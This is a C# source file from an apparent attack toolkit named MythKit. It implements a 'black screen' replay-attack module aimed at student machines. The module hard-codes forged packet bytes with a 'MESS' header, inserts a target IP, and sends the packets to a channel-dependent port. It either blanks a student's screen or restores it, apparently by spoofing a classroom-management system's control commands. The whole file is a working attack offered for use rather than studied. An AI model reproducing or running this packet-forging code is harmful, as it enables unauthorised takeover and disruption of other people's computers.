using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace MythKit.Pages.ReplayAttack.AttackPatterns
{
    /// <summary>
    /// BlackScreenAttack.xaml 的交互逻辑
    /// </summary>
    public partial class BlackScreenAttack : UserControl, IAttackPattern
    {
        public BlackScreenAttack()
        {
            InitializeComponent();
        }
        public string AttackName => "黑屏安静";
        public string AttackId => "black_screen";
        public AttackTarget Target => AttackTarget.Student;
        public void Deserialize(Dictionary<string, object> serializedData)
        {
            if (serializedData == null)
                return;

            if (serializedData.TryGetValue("openCloseSwitch", out object openCloseValue) &&
                bool.TryParse(Convert.ToString(openCloseValue), out bool isOn))
                OpenCloseSwitch.IsOn = isOn;

            if (serializedData.TryGetValue("tdChannelId", out object channelValue) &&
                double.TryParse(Convert.ToString(channelValue), out double channelId))
                TDChannelID.Value = channelId;
        }

        public Dictionary<string, object> Serialize() => new Dictionary<string, object>
        {
            ["openCloseSwitch"] = OpenCloseSwitch.IsOn,
            ["tdChannelId"] = TDChannelID.Value
        };

        public AttackPacket ConstructPacket(ref string message, IPAddress ip, int cycleCount, int groupCount)
        {
            byte[] packetBlack = new byte[55]
            {
                0x4d, 0x45, 0x53, 0x53, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, // IP Bytes to be replaced
                0x27, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00,
                0x01, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
            };
            byte[] packetRecovery = new byte[29]
            {
                0x4d, 0x45, 0x53, 0x53, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, // IP Bytes to be replaced
                0x0d, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x90, 0x00
            };
            byte[] ipBytes = ip.GetAddressBytes();
            Array.Copy(ipBytes, 0, packetBlack, 12, 4);
            Array.Copy(ipBytes, 0, packetRecovery, 12, 4);
            if (OpenCloseSwitch.IsOn)
            {
                return new AttackPacket(new List<byte[]> { packetBlack }, 5000 + (int)TDChannelID.Value * 512);
            }
            else
            {
                return new AttackPacket(new List<byte[]> { packetRecovery }, 5000 + (int)TDChannelID.Value * 512);
            }
        }
    }
}
